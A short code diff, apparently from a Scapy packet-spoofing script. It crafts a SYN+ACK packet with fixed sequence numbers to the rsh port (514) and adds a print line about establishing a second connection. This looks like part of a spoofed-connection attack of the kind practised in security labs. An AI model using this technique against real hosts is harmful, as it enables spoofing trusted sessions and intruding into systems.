@@ -5,5 +5,7 @@ tcp = TCP(sport=9090, dport=514, flags="SA", seq=378933595, ack=3814954128)
 
 pkt = ip/tcp
 
+print("sending syn+ack packet to establish 2nd connection")
+
 ls(pkt)
 send(pkt, verbose=0)
